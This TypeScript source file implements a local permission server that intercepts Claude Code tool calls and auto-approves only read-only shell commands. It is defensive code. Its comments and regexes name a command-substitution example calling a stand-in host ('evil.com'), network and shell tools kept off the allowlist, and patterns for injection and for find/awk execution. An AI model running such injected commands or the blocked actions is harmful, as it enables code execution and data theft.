/**
 * Permission Hook Server
 *
 * A local HTTP server that acts as a Claude Code PreToolUse hook handler.
 * When Claude Code wants to use a tool, it POSTs the tool request here.
 * The server forwards it to the renderer (PermissionCard), waits for the
 * user's decision, and returns the structured hook response.
 *
 * This is a RAX-owned permission broker that approximates Claude Code's
 * practical permission cadence. It does not reproduce native permission
 * semantics exactly — it intercepts the small set of tool classes that
 * map to real, user-meaningful approval moments.
 *
 * Security:
 *   - Per-launch app secret in URL path (prevents local spoofing)
 *   - Per-run token in URL path (prevents cross-run confusion)
 *   - Deny-by-default on every failure path
 *   - Per-run settings files (only RAX-spawned sessions see the hook)
 */

import { createServer, IncomingMessage, ServerResponse } from 'http'
import { EventEmitter } from 'events'
import { writeFileSync, mkdirSync, unlinkSync, readdirSync, statSync } from 'fs'
import { tmpdir } from 'os'
import { join } from 'path'
import { randomUUID } from 'crypto'
import { log as _log } from '../logger'
const PERMISSION_TIMEOUT_MS = 5 * 60 * 1000 // 5 minutes
const DEFAULT_PORT = 19836
const MAX_BODY_SIZE = 1024 * 1024 // 1MB
// Grace window before deleting a finished run's settings file, so in-flight
// PreToolUse POSTs that race with process exit still see the runToken.
const RUN_TEARDOWN_GRACE_MS = 30 * 1000
// Stale settings files older than this are swept on startup (crash leftovers).
const STARTUP_SWEEP_MAX_AGE_MS = 24 * 60 * 60 * 1000
// Cap the EADDRINUSE retry walk so a pathological env (CI, dev with many
// stuck processes) can't loop forever bumping the port.
const MAX_PORT_RETRIES = 50

const DEBUG = process.env.RAX_DEBUG === '1'

// Tools that need explicit user approval via the permission card.
// This is the small set of tool classes that map to real, user-meaningful
// approval moments. Routine internal agent mechanics (Read, Glob, Grep, etc.)
// are auto-approved via --allowedTools to avoid noisy UX.
const PERMISSION_REQUIRED_TOOLS = ['Bash', 'Edit', 'Write', 'MultiEdit', 'WebFetch']

// Bash commands that are clearly read-only and safe to auto-approve.
// Matches the leading command (before any pipes, semicolons, or &&).
//
// Conservative by design: when in doubt, leave it OUT and let the user prompt.
// Anything that can be coerced to run another program (env, xargs, sudo, ssh)
// or persist state (defaults write, set -e) is intentionally absent.
const SAFE_BASH_COMMANDS = new Set([
  // Info / help
  'cat', 'head', 'tail', 'less', 'more', 'wc', 'file', 'stat',
  'ls', 'pwd', 'echo', 'printf', 'date', 'whoami', 'hostname', 'uname',
  'which', 'whence', 'where', 'type', 'command',
  'man', 'help', 'info',
  // Search
  'find', // further checked: blocks -exec/-delete/-ok/-fprint
  'grep', 'rg', 'ag', 'ack', 'fd', 'fzf', 'locate',
  // Git read-only
  'git', // further checked: only read-only subcommands
  // Env / config (read-only)
  'printenv',
  // Package info (read-only — subcommand checks below block install/run/etc.)
  'npm', 'yarn', 'pnpm', 'bun', 'cargo', 'pip', 'pip3', 'go', 'rustup',
  // NOTE: bare interpreters (`node`, `python`, `ruby`, `java`) are NOT auto-approved.
  // `node -e "..."`, `python -c "..."`, etc. execute arbitrary code, which is
  // indistinguishable from Write/Bash in terms of risk. Always require a prompt.
  // Claude CLI (read-only subcommands)
  'claude',
  // Disk / system info
  'df', 'du', 'free', 'top', 'htop', 'ps', 'uptime', 'lsof',
  'tree', 'realpath', 'dirname', 'basename',
  // macOS read-only
  'sw_vers', 'system_profiler', 'mdls', 'mdfind',
  // NOTE: `defaults` is NOT here — `defaults write` mutates user prefs.
  // Diff / compare
  'diff', 'cmp', 'comm', 'sort', 'uniq', 'cut',
  // Text utilities (further checked: sed/awk have execution side-channels)
  'awk', 'sed',
  'jq', 'yq', 'tr',
  // NOTE: `xargs` is NOT here — it executes arbitrary commands. Same for `env`,
  // `set`, `eval`, `exec`, `sudo`, `ssh`, `scp`, `rsync`, `nc`, `curl`, `wget`.
])

// Git subcommands that mutate state (not safe to auto-approve)
const GIT_MUTATING_SUBCOMMANDS = new Set([
  'push', 'commit', 'merge', 'rebase', 'reset', 'checkout', 'switch',
  'branch', 'tag', 'stash', 'cherry-pick', 'revert', 'am', 'apply',
  'clean', 'rm', 'mv', 'restore', 'bisect', 'pull', 'fetch', 'clone',
  'init', 'submodule', 'worktree', 'gc', 'prune', 'filter-branch',
])

// Claude subcommands that mutate state
const CLAUDE_MUTATING_SUBCOMMANDS = new Set([
  'config', 'login', 'logout',
])

// Package-manager subcommands that install/run code (block these for the
// pip/cargo/go/rustup family — npm/yarn/pnpm/bun have their own list below).
const PIP_MUTATING_SUBCOMMANDS = new Set([
  'install', 'uninstall', 'wheel', 'download',
])
const CARGO_MUTATING_SUBCOMMANDS = new Set([
  'install', 'uninstall', 'run', 'build', 'publish', 'fetch', 'update', 'add', 'remove', 'new', 'init', 'fix', 'clean',
])
const GO_MUTATING_SUBCOMMANDS = new Set([
  'install', 'run', 'get', 'mod', 'build', 'test', 'generate', 'work', 'tool', 'fix', 'clean',
])
const RUSTUP_MUTATING_SUBCOMMANDS = new Set([
  'install', 'uninstall', 'update', 'set', 'override', 'self', 'run',
])

const NODE_PKG_MUTATING_SUBCOMMANDS = new Set([
  'install', 'i', 'add', 'remove', 'uninstall', 'rm', 'publish', 'run', 'run-script',
  'exec', 'x', 'dlx', 'npx', 'create', 'init', 'link', 'unlink', 'pack', 'deprecate',
  'rebuild', 'audit', 'update', 'upgrade', 'set', 'config',
])

// `find` flags that execute commands or modify the filesystem.
const FIND_DANGEROUS_FLAGS = /(?:^|\s)(?:-(?:exec|execdir|ok|okdir|delete|fprint|fprint0|fprintf))\b/

// Patterns that indicate command substitution or process substitution — anything
// that can run another program inside an otherwise-safe command. Block all of
// them: backticks, $(...), <(...), >(...).
const COMMAND_INJECTION_RE = /`|\$\(|\$\{|<\(|>\(/

// Newline = command separator in shell. Our segment splitter doesn't see them
// as boundaries, so we'd miss commands hidden after a newline.
const HIDES_NEWLINE_RE = /[\r\n]/

// Detect a leading variable assignment like `FOO=bar` (env var prefix). The
// command name follows the assignments. We must skip ALL of them, not just one.
const ENV_VAR_ASSIGN_RE = /^[A-Za-z_][A-Za-z0-9_]*=/

/**
 * Skip leading env-var assignments (FOO=1 BAR=2 ...) and leading flags that
 * carry their own argument (e.g. `git -c foo=bar push`, `git --git-dir=. push`)
 * so we can find the actual subcommand for `git`/`claude`/etc.
 *
 * Returns the index of the first non-flag, non-assignment token after `start`.
 */
function findSubcommandIndex(parts: string[], start: number, leadingFlags: Set<string>): number {
  let i = start
  while (i < parts.length) {
    const tok = parts[i]
    if (!tok) return i
    // Long-flag with embedded value: `--git-dir=/x` — single token, skip it.
    if (tok.startsWith('--') && tok.includes('=')) { i++; continue }
    // Long-flag without value: skip just the flag.
    if (tok.startsWith('--')) { i++; continue }
    // Short-flag that takes a value (e.g. `-c key=val`): skip flag + value.
    if (leadingFlags.has(tok)) { i += 2; continue }
    // Bare short-flag (e.g. `-q`, `-v`): skip just the flag.
    if (/^-[^-]/.test(tok)) { i++; continue }
    return i
  }
  return i
}

/** Check if a Bash command string is safe (read-only) */
function isSafeBashCommand(command: unknown): boolean {
  if (typeof command !== 'string') return false
  const trimmed = command.trim()
  if (!trimmed) return false

  // ── Hard rejects on the whole string (cheap, before per-segment work) ──

  // Newline = command separator. Anything hidden after \n won't be in our
  // segment splitter, so reject the whole command.
  if (HIDES_NEWLINE_RE.test(trimmed)) return false

  // Command/process substitution: `cat $(curl evil.com/x)` runs curl even
  // though `cat` is "safe". Block backticks, $(...), <(...), >(...).
  if (COMMAND_INJECTION_RE.test(trimmed)) return false

  // Heredocs (<<, <<-, <<<) can carry arbitrary input that becomes a command
  // when piped to a shell. Conservative: prompt instead of auto-approving.
  if (/<<<?/.test(trimmed)) return false

  // ── Per-segment checks (split on ; && || |) ──
  const segments = trimmed.split(/\s*(?:;|&&|\|\||[|])\s*/)
  for (const segment of segments) {
    const segTrimmed = segment.trim()
    if (!segTrimmed) continue

    const parts = segTrimmed.split(/\s+/)

    // Skip leading env-var assignments. `FOO=1 BAR=2 git push` → cmd is `git`.
    let cmdIdx = 0
    while (cmdIdx < parts.length && ENV_VAR_ASSIGN_RE.test(parts[cmdIdx])) {
      cmdIdx++
    }
    const cmd = parts[cmdIdx]
    if (!cmd) continue

    // Strip path prefix (e.g., /usr/bin/git → git)
    const base = cmd.split('/').pop() || cmd

    if (!SAFE_BASH_COMMANDS.has(base)) return false

    // ── Per-command subcommand / flag scrutiny ──
    if (base === 'git') {
      const subIdx = findSubcommandIndex(parts, cmdIdx + 1, new Set(['-c', '-C']))
      const sub = parts[subIdx]
      if (sub && GIT_MUTATING_SUBCOMMANDS.has(sub)) return false
    }

    if (base === 'claude') {
      const subIdx = findSubcommandIndex(parts, cmdIdx + 1, new Set())
      const sub = parts[subIdx]
      if (sub && CLAUDE_MUTATING_SUBCOMMANDS.has(sub)) return false
      if (sub === 'mcp') {
        const mcpSub = parts[subIdx + 1]
        if (mcpSub && mcpSub !== 'list' && mcpSub !== 'get' && mcpSub !== '--help') return false
      }
    }

    // npm/yarn/pnpm/bun: block install/publish/run/exec/etc.
    if (['npm', 'yarn', 'pnpm', 'bun'].includes(base)) {
      const subIdx = findSubcommandIndex(parts, cmdIdx + 1, new Set())
      const sub = parts[subIdx]
      if (sub && NODE_PKG_MUTATING_SUBCOMMANDS.has(sub)) return false
    }

    // pip / pip3: block install/uninstall/wheel/download
    if (base === 'pip' || base === 'pip3') {
      const subIdx = findSubcommandIndex(parts, cmdIdx + 1, new Set())
      const sub = parts[subIdx]
      if (sub && PIP_MUTATING_SUBCOMMANDS.has(sub)) return false
    }

    if (base === 'cargo') {
      const subIdx = findSubcommandIndex(parts, cmdIdx + 1, new Set())
      const sub = parts[subIdx]
      if (sub && CARGO_MUTATING_SUBCOMMANDS.has(sub)) return false
    }

    if (base === 'go') {
      const subIdx = findSubcommandIndex(parts, cmdIdx + 1, new Set())
      const sub = parts[subIdx]
      if (sub && GO_MUTATING_SUBCOMMANDS.has(sub)) return false
    }

    if (base === 'rustup') {
      const subIdx = findSubcommandIndex(parts, cmdIdx + 1, new Set())
      const sub = parts[subIdx]
      if (sub && RUSTUP_MUTATING_SUBCOMMANDS.has(sub)) return false
    }

    // find: block -exec/-execdir/-ok/-okdir/-delete/-fprint*
    if (base === 'find' && FIND_DANGEROUS_FLAGS.test(segTrimmed)) return false

    // sed: block in-place edit. Covers `-i`, `--in-place`, BSD's `-i ''`,
    // and combined short flags like `-ie`, `-Ei`, `-ni`.
    if (base === 'sed') {
      if (/--in-place\b/.test(segTrimmed)) return false
      const tokens = parts.slice(cmdIdx + 1)
      if (tokens.some((t) => /^-[A-Za-z]*i[A-Za-z]*$/.test(t))) return false
    }

    // awk: block scripts that call system(), getline from a pipe, or print >.
    // We can't fully parse the awk program, so any of these substrings is a stop sign.
    if (base === 'awk' && /system\s*\(|getline\s+["'][^"']*["']\s*\||print\s*>|printf\s*[^,]*>|\|\s*getline/.test(segment)) {
      return false
    }

    // Block any write redirect to a file. Strip known-safe idioms first, then
    // refuse if any write redirect remains. Catches: >file, >>file, 1>file,
    // 2>file, &>file, 3>file.
    const stripped = segTrimmed
      .replace(/2>&1/g, '')
      .replace(/&>\s*\/dev\/null/g, '')
      .replace(/[0-9]?>>?\s*\/dev\/null/g, '')
    if (/[0-9&]?>>?(?!&)/.test(stripped)) return false

    // `tee`, `script`, and `mktemp` write to disk regardless of redirects.
    if (/\b(?:tee|script|mktemp)\b/.test(segTrimmed)) return false
  }

  return true
}

// Regex matcher for the hook config — intercept dangerous tools + external MCP tools.
// `mcp__rax-tools__*` is the in-process computer-use MCP wired by RAX itself
// (rax_screenshot / rax_control_screen). Those tools route through the orb's
// local HTTP bridge with its own permission story (macOS Accessibility), so we
// negative-lookahead them out of the hook matcher — otherwise every screenshot
// in ask mode would surface a permission card the user can't sensibly answer.
const HOOK_MATCHER = `^(${PERMISSION_REQUIRED_TOOLS.join('|')}|mcp__(?!rax-tools__).*)$`

// Fields in tool_input that should be redacted in logs
const SENSITIVE_FIELD_RE = /token|password|secret|key|auth|credential|api.?key/i

// Exhaustive whitelist of valid decision IDs from permission card options.
// Any decision not in this set is denied (fail-closed).
const VALID_ALLOW_DECISIONS = new Set(['allow', 'allow-session', 'allow-domain'])
const VALID_DECISIONS = new Set([...VALID_ALLOW_DECISIONS, 'deny'])

function log(msg: string): void {
  _log('PermissionServer', msg)
}

/** Extract domain from a URL string, returns null on failure */
function extractDomain(url: unknown): string | null {
  if (typeof url !== 'string') return null
  try {
    return new URL(url).hostname
  } catch {
    return null
  }
}

/** Build a deny hook response */
function denyResponse(reason: string) {
  return {
    hookSpecificOutput: {
      hookEventName: 'PreToolUse',
      permissionDecision: 'deny',
      permissionDecisionReason: reason,
    },
  }
}

/** Build an allow hook response */
function allowResponse(reason: string) {
  return {
    hookSpecificOutput: {
      hookEventName: 'PreToolUse',
      permissionDecision: 'allow',
      permissionDecisionReason: reason,
    },
  }
}

export interface HookToolRequest {
  session_id: string
  transcript_path: string
  cwd: string
  permission_mode: string
  hook_event_name: string
  tool_name: string
  tool_input: Record<string, unknown>
  tool_use_id: string
}

export interface PermissionDecision {
  decision: 'allow' | 'deny'
  reason?: string
}

export interface PermissionOption {
  id: string
  label: string
  kind: 'allow' | 'deny'
}

interface PendingRequest {
  toolRequest: HookToolRequest
  resolve: (decision: PermissionDecision) => void
  timeout: ReturnType<typeof setTimeout>
  questionId: string
  runToken: string
}

interface RunRegistration {
  tabId: string
  requestId: string
  sessionId: string | null
}

/**
 * PermissionServer: HTTP server for Claude Code PreToolUse hooks.
 *
 * Events:
 *  - 'permission-request' (questionId, toolRequest, tabId, options) — forward to renderer
 */
export class PermissionServer extends EventEmitter {
  private server: ReturnType<typeof createServer> | null = null
  private pendingRequests = new Map<string, PendingRequest>()
  private port: number
  private _actualPort: number | null = null

  /** Per-launch secret — validates that requests come from our hooks */
  private appSecret: string

  /** Per-run tokens → run registration (tabId, requestId, sessionId) */
  private runTokens = new Map<string, RunRegistration>()

  /** Scoped "allow always" keys. Format varies by tool type. */
  private scopedAllows = new Set<string>()

  /** Tracked generated settings files: runToken → filePath */
  private settingsFiles = new Map<string, string>()

  /** Pending teardown timers for unregisterRun grace window */
  private teardownTimers = new Map<string, ReturnType<typeof setTimeout>>()

  constructor(port = DEFAULT_PORT) {
    super()
    this.port = port
    this.appSecret = randomUUID()
    this._sweepStaleSettingsFiles()
  }

  /**
   * Delete settings files left over from prior crashes. Runs once at startup.
   * Files are short-lived and tied to a specific app launch's secret, so
   * anything older than STARTUP_SWEEP_MAX_AGE_MS is unreachable garbage.
   */
  private _sweepStaleSettingsFiles(): void {
    const dir = join(tmpdir(), 'rax-hook-config')
    let entries: string[]
    try {
      entries = readdirSync(dir)
    } catch {
      return // Dir doesn't exist yet — nothing to sweep
    }
    const now = Date.now()
    let removed = 0
    for (const name of entries) {
      if (!name.startsWith('rax-hook-') || !name.endsWith('.json')) continue
      const full = join(dir, name)
      try {
        const st = statSync(full)
        if (now - st.mtimeMs > STARTUP_SWEEP_MAX_AGE_MS) {
          unlinkSync(full)
          removed++
        }
      } catch {}
    }
    if (removed > 0) log(`Swept ${removed} stale settings file(s) from ${dir}`)
  }

  async start(): Promise<number> {
    if (this.server) {
      log('Server already running')
      return this._actualPort || this.port
    }

    return new Promise((resolve, reject) => {
      this.server = createServer((req, res) => this._handleRequest(req, res))

      const startPort = this.port
      let retries = 0

      this.server.on('error', (err: NodeJS.ErrnoException) => {
        if (err.code === 'EADDRINUSE' && retries < MAX_PORT_RETRIES) {
          retries++
          log(`Port ${this.port} in use, trying ${this.port + 1}`)
          this.port++
          this.server!.listen(this.port, '127.0.0.1')
        } else if (err.code === 'EADDRINUSE') {
          const msg = `All ports ${startPort}-${this.port} in use after ${MAX_PORT_RETRIES} retries`
          log(msg)
          reject(new Error(msg))
        } else {
          log(`Server error: ${err.message}`)
          reject(err)
        }
      })

      this.server.listen(this.port, '127.0.0.1', () => {
        this._actualPort = this.port
        log(`Permission server listening on 127.0.0.1:${this.port}`)
        resolve(this.port)
      })
    })
  }

  stop(): void {
    // Deny all pending requests and notify renderer so any open cards clear.
    for (const [qid, pending] of this.pendingRequests) {
      clearTimeout(pending.timeout)
      const tabId = this.runTokens.get(pending.runToken)?.tabId ?? null
      pending.resolve({ decision: 'deny', reason: 'Server shutting down' })
      this.emit('permission-resolved', qid, 'shutdown', tabId)
      this.pendingRequests.delete(qid)
    }

    // Cancel any pending teardown grace timers
    for (const t of this.teardownTimers.values()) clearTimeout(t)
    this.teardownTimers.clear()

    // Clean up all remaining settings files (best-effort)
    for (const [, filePath] of this.settingsFiles) {
      try { unlinkSync(filePath) } catch {}
    }
    this.settingsFiles.clear()

    if (this.server) {
      this.server.close()
      this.server = null
      // Reset _actualPort so getPort() honestly reports "no server" — otherwise
      // a dispatch after stop() (e.g. dev hot-reload that briefly tears down
      // the control plane) would generate a settings file pointing at a dead
      // URL, claude's hook POST would fail silently, and the tool would be
      // denied with no UI signal.
      this._actualPort = null
      log('Permission server stopped')
    }
  }

  getPort(): number | null {
    return this._actualPort
  }

  /** Whether the HTTP server is currently listening. */
  isRunning(): boolean {
    return this.server !== null && this._actualPort !== null
  }

  // ─── Run Registration ───

  /**
   * Register a new run. Returns a unique run token.
   * The run token is embedded in the hook URL for per-run routing.
   */
  registerRun(tabId: string, requestId: string, sessionId: string | null): string {
    const runToken = randomUUID()
    this.runTokens.set(runToken, { tabId, requestId, sessionId })
    log(`Registered run: token=${runToken.substring(0, 8)}… tab=${tabId.substring(0, 8)}…`)
    return runToken
  }

  /**
   * Unregister a run after a grace window. The run process has just exited
   * but a tool's PreToolUse POST may still be in-flight on the network — if
   * we yank the token immediately it lands on a 403 "Unknown run" and the
   * tool gets denied with no UI feedback. Hold the token + settings file
   * for RUN_TEARDOWN_GRACE_MS so racing requests still see them.
   */
  unregisterRun(runToken: string): void {
    const reg = this.runTokens.get(runToken)
    if (!reg) return

    // Deny any pending requests immediately (the renderer card is now stale)
    // and notify the control plane so it can clear the renderer state.
    for (const [qid, pending] of this.pendingRequests) {
      if (pending.runToken === runToken) {
        clearTimeout(pending.timeout)
        pending.resolve({ decision: 'deny', reason: 'Run ended' })
        this.emit('permission-resolved', qid, 'run-ended', reg.tabId)
        this.pendingRequests.delete(qid)
      }
    }

    // Don't tear down yet — schedule it. If the same token gets unregistered
    // twice (rare but possible on rapid restart), reset the timer.
    const existing = this.teardownTimers.get(runToken)
    if (existing) clearTimeout(existing)

    const timer = setTimeout(() => {
      const filePath = this.settingsFiles.get(runToken)
      if (filePath) {
        try { unlinkSync(filePath) } catch {}
        this.settingsFiles.delete(runToken)
      }
      this.runTokens.delete(runToken)
      this.teardownTimers.delete(runToken)
      if (DEBUG) log(`Torn down run: token=${runToken.substring(0, 8)}…`)
    }, RUN_TEARDOWN_GRACE_MS)
    this.teardownTimers.set(runToken, timer)
    log(`Unregistered run: token=${runToken.substring(0, 8)}… (teardown in ${RUN_TEARDOWN_GRACE_MS}ms)`)
  }

  // ─── Permission Response ───

  /**
   * Respond to a pending permission request.
   * decision: 'allow' (once), 'allow-session' (for session), 'allow-domain' (WebFetch domain), 'deny'
   */
  respondToPermission(questionId: string, decision: string, reason?: string): boolean {
    const pending = this.pendingRequests.get(questionId)
    if (!pending) {
      log(`respondToPermission: no pending request for ${questionId}`)
      return false
    }

    clearTimeout(pending.timeout)
    this.pendingRequests.delete(questionId)

    // Fail-closed: reject unknown decision IDs immediately
    if (!VALID_DECISIONS.has(decision)) {
      log(`Unknown decision "${decision}" for [${questionId}] — denying (fail-closed)`)
      pending.resolve({ decision: 'deny', reason: `Unknown decision: ${decision}` })
      return true
    }

    const toolName = pending.toolRequest.tool_name
    const sessionId = pending.toolRequest.session_id
    // Look up the tabId from the run token captured at request time.
    // Falls back to a fake tabId if the run was already torn down — the
    // session-scoped key still works in that case for the current run.
    const tabId = this.runTokens.get(pending.runToken)?.tabId

    // Handle scoped "allow always" decisions. We write BOTH tab- and
    // session-scoped keys: tab-scoped survives `claude --resume` (which
    // mints a new session_id), session-scoped is the historical key.
    if (decision === 'allow-session') {
      this.scopedAllows.add(`session:${sessionId}:tool:${toolName}`)
      if (tabId) this.scopedAllows.add(`tab:${tabId}:tool:${toolName}`)
      log(`Allowed ${toolName} for session ${sessionId.substring(0, 8)}… / tab ${tabId?.substring(0, 8) ?? '—'}…`)
    } else if (decision === 'allow-domain') {
      const domain = extractDomain(pending.toolRequest.tool_input?.url)
      if (domain) {
        this.scopedAllows.add(`session:${sessionId}:webfetch:${domain}`)
        if (tabId) this.scopedAllows.add(`tab:${tabId}:webfetch:${domain}`)
        log(`Allowed ${domain} for session ${sessionId.substring(0, 8)}… / tab ${tabId?.substring(0, 8) ?? '—'}…`)
      }
    }

    const hookDecision: 'allow' | 'deny' = VALID_ALLOW_DECISIONS.has(decision) ? 'allow' : 'deny'
    if (DEBUG) {
      log(`respondToPermission [${questionId}]: ${decision} (tool=${toolName})`)
    } else {
      log(`Permission: ${toolName} → ${hookDecision}`)
    }
    pending.resolve({ decision: hookDecision, reason })
    return true
  }

  /**
   * Grant a tab-scoped allow for a tool without going through the normal
   * pending-request flow. Used to retroactively approve tools that were
   * denied. Tab-scoped (not session-scoped) because `claude --resume` mints
   * a new session_id, so a session-scoped allow wouldn't survive the very
   * next prompt — which defeats the whole "allow & retry" flow.
   */
  addTabAllow(tabId: string, toolName: string): void {
    if (!tabId || !toolName) return
    this.scopedAllows.add(`tab:${tabId}:tool:${toolName}`)
    log(`Retro-allow ${toolName} for tab ${tabId.substring(0, 8)}…`)
  }

  /**
   * Drop every scoped allow keyed to a tab. Called when the tab is closed,
   * so the set doesn't grow unboundedly across long sessions and a future
   * tab can't (theoretically) re-collide on a recycled UUID.
   */
  dropTabAllows(tabId: string): void {
    if (!tabId) return
    const prefix = `tab:${tabId}:`
    let removed = 0
    for (const key of this.scopedAllows) {
      if (key.startsWith(prefix)) {
        this.scopedAllows.delete(key)
        removed++
      }
    }
    if (removed > 0) log(`Dropped ${removed} tab-scoped allow(s) for tab ${tabId.substring(0, 8)}…`)
  }

  /**
   * Look up the tabId for a pending question so callers can route a
   * resolution event to the right renderer tab instead of broadcasting.
   */
  getTabIdForQuestion(questionId: string): string | null {
    const pending = this.pendingRequests.get(questionId)
    if (!pending) return null
    return this.runTokens.get(pending.runToken)?.tabId ?? null
  }

  // ─── Dynamic Options ───

  /**
   * Get permission card options for a given tool + input.
   * WebFetch gets domain-scoped options; all others get session-scoped.
   */
  getOptionsForTool(toolName: string, toolInput?: Record<string, unknown>): PermissionOption[] {
    // Bash commands are too diverse for session-scoped blanket allow —
    // each command should be individually reviewed.
    if (toolName === 'Bash') {
      return [
        { id: 'allow', label: 'Allow Once', kind: 'allow' },
        { id: 'deny', label: 'Deny', kind: 'deny' },
      ]
    }

    // WebFetch gets a domain-scoped allow when we can extract a hostname.
    // Falls back to session-scoped if the URL is missing or unparseable.
    if (toolName === 'WebFetch') {
      const domain = extractDomain(toolInput?.url)
      const opts: PermissionOption[] = [
        { id: 'allow', label: 'Allow Once', kind: 'allow' },
      ]
      if (domain) {
        opts.push({ id: 'allow-domain', label: `Allow ${domain}`, kind: 'allow' })
      }
      opts.push({ id: 'allow-session', label: 'Allow for Session', kind: 'allow' })
      opts.push({ id: 'deny', label: 'Deny', kind: 'deny' })
      return opts
    }

    // Edit, Write, MultiEdit, mcp__* — session-scoped allow is safe
    return [
      { id: 'allow', label: 'Allow Once', kind: 'allow' },
      { id: 'allow-session', label: 'Allow for Session', kind: 'allow' },
      { id: 'deny', label: 'Deny', kind: 'deny' },
    ]
  }

  // ─── Settings File Generation ───

  /**
   * Generate a per-run settings file with the PreToolUse HTTP hook.
   * The URL includes both appSecret and runToken for authentication.
   */
  generateSettingsFile(runToken: string): string {
    const port = this._actualPort || this.port
    const settings = {
      hooks: {
        PreToolUse: [
          {
            matcher: HOOK_MATCHER,
            hooks: [
              {
                type: 'http',
                url: `http://127.0.0.1:${port}/hook/pre-tool-use/${this.appSecret}/${runToken}`,
                timeout: 300,
              },
            ],
          },
        ],
      },
    }

    const dir = join(tmpdir(), 'rax-hook-config')
    try { mkdirSync(dir, { recursive: true, mode: 0o700 }) } catch {}

    const filePath = join(dir, `rax-hook-${runToken}.json`)
    writeFileSync(filePath, JSON.stringify(settings, null, 2), { mode: 0o600 })
    this.settingsFiles.set(runToken, filePath)
    if (DEBUG) {
      log(`Generated settings file: ${filePath} (port=${port})`)
    }
    return filePath
  }

  // ─── HTTP Request Handling ───

  private async _handleRequest(req: IncomingMessage, res: ServerResponse): Promise<void> {
    // POST only — deny everything else
    if (req.method !== 'POST') {
      res.writeHead(404, { 'Content-Type': 'application/json' })
      res.end(JSON.stringify(denyResponse('Not found')))
      return
    }

    // Parse URL: /hook/pre-tool-use/<appSecret>/<runToken>
    const segments = (req.url || '').split('/').filter(Boolean)
    if (segments.length !== 4 || segments[0] !== 'hook' || segments[1] !== 'pre-tool-use') {
      res.writeHead(404, { 'Content-Type': 'application/json' })
      res.end(JSON.stringify(denyResponse('Invalid path')))
      return
    }

    const urlSecret = segments[2]
    const urlToken = segments[3]

    // Validate app secret
    if (urlSecret !== this.appSecret) {
      log('Rejected request: invalid app secret')
      res.writeHead(403, { 'Content-Type': 'application/json' })
      res.end(JSON.stringify(denyResponse('Invalid credentials')))
      return
    }

    // Validate run token
    const registration = this.runTokens.get(urlToken)
    if (!registration) {
      log(`Rejected request: unknown run token ${urlToken.substring(0, 8)}…`)
      res.writeHead(403, { 'Content-Type': 'application/json' })
      res.end(JSON.stringify(denyResponse('Unknown run')))
      return
    }

    // Read body with size limit
    let body = ''
    let bodySize = 0
    for await (const chunk of req) {
      bodySize += (chunk as Buffer).length
      if (bodySize > MAX_BODY_SIZE) {
        log('Rejected request: body too large')
        res.writeHead(413, { 'Content-Type': 'application/json' })
        res.end(JSON.stringify(denyResponse('Request too large')))
        return
      }
      body += chunk
    }

    // Parse JSON
    let toolRequest: HookToolRequest
    try {
      toolRequest = JSON.parse(body) as HookToolRequest
    } catch {
      log('Rejected request: invalid JSON')
      res.writeHead(400, { 'Content-Type': 'application/json' })
      res.end(JSON.stringify(denyResponse('Invalid JSON')))
      return
    }

    // Validate required fields
    if (!toolRequest.tool_name || !toolRequest.session_id || !toolRequest.hook_event_name) {
      log('Rejected request: missing required fields')
      res.writeHead(400, { 'Content-Type': 'application/json' })
      res.end(JSON.stringify(denyResponse('Missing required fields')))
      return
    }

    // Validate hook event name
    if (toolRequest.hook_event_name !== 'PreToolUse') {
      log(`Rejected request: unexpected hook event ${toolRequest.hook_event_name}`)
      res.writeHead(400, { 'Content-Type': 'application/json' })
      res.end(JSON.stringify(denyResponse('Unexpected hook event')))
      return
    }

    if (DEBUG) {
      log(`Hook request: tool=${toolRequest.tool_name} id=${toolRequest.tool_use_id} session=${toolRequest.session_id} tab=${registration.tabId.substring(0, 8)}…`)
    } else {
      log(`Hook: ${toolRequest.tool_name} → tab=${registration.tabId.substring(0, 8)}…`)
    }

    // Check scoped allows. Tab-scoped is checked first because it survives
    // `claude --resume` (which mints a new session_id every time).
    const sessionId = toolRequest.session_id
    const toolName = toolRequest.tool_name
    const tabId = registration.tabId

    if (
      this.scopedAllows.has(`tab:${tabId}:tool:${toolName}`) ||
      this.scopedAllows.has(`session:${sessionId}:tool:${toolName}`)
    ) {
      if (DEBUG) log(`Auto-allowing ${toolName} (scope-allowed)`)
      res.writeHead(200, { 'Content-Type': 'application/json' })
      res.end(JSON.stringify(allowResponse('Allowed for session by user')))
      return
    }

    // Check domain-scoped allow (WebFetch)
    if (toolName === 'WebFetch') {
      const domain = extractDomain(toolRequest.tool_input?.url)
      if (
        domain && (
          this.scopedAllows.has(`tab:${tabId}:webfetch:${domain}`) ||
          this.scopedAllows.has(`session:${sessionId}:webfetch:${domain}`)
        )
      ) {
        if (DEBUG) log(`Auto-allowing WebFetch to ${domain} (domain-allowed)`)
        res.writeHead(200, { 'Content-Type': 'application/json' })
        res.end(JSON.stringify(allowResponse(`Domain ${domain} allowed by user`)))
        return
      }
    }

    // Auto-approve safe (read-only) Bash commands without prompting.
    // Don't log the raw command — it can contain tokens, passwords, or signed
    // URLs. Just log the leading executable for diagnosis.
    if (toolName === 'Bash' && isSafeBashCommand(toolRequest.tool_input?.command)) {
      if (DEBUG) {
        const cmd = String(toolRequest.tool_input?.command || '').trim().split(/\s+/)[0] || '?'
        log(`Auto-allowing safe Bash: ${cmd}`)
      }
      res.writeHead(200, { 'Content-Type': 'application/json' })
      res.end(JSON.stringify(allowResponse('Safe read-only command')))
      return
    }

    // Generate question ID and wait for user decision
    const questionId = `hook-${Date.now()}-${Math.random().toString(36).substring(2, 8)}`

    const decision = await new Promise<PermissionDecision>((resolve) => {
      const timeout = setTimeout(() => {
        log(`Permission timeout [${questionId}] — auto-denying`)
        this.pendingRequests.delete(questionId)
        // Notify the renderer so the (now-stale) PermissionCard gets cleared.
        // We have the tabId here from the registration captured at request time.
        this.emit('permission-resolved', questionId, 'timeout', registration.tabId)
        resolve({ decision: 'deny', reason: 'Permission timed out after 5 minutes' })
      }, PERMISSION_TIMEOUT_MS)

      this.pendingRequests.set(questionId, {
        toolRequest,
        resolve,
        timeout,
        questionId,
        runToken: urlToken,
      })

      // Get tool-specific options for the permission card
      const options = this.getOptionsForTool(toolName, toolRequest.tool_input)

      // Emit with direct tabId from registration — no session_id lookup needed
      this.emit('permission-request', questionId, toolRequest, registration.tabId, options)
    })

    // Return structured hook response
    const hookResponse = decision.decision === 'allow'
      ? allowResponse(decision.reason || 'Approved by user')
      : denyResponse(decision.reason || 'Denied by user')

    if (DEBUG) {
      log(`Hook response [${questionId}]: ${decision.decision}`)
    }
    res.writeHead(200, { 'Content-Type': 'application/json' })
    res.end(JSON.stringify(hookResponse))
  }
}

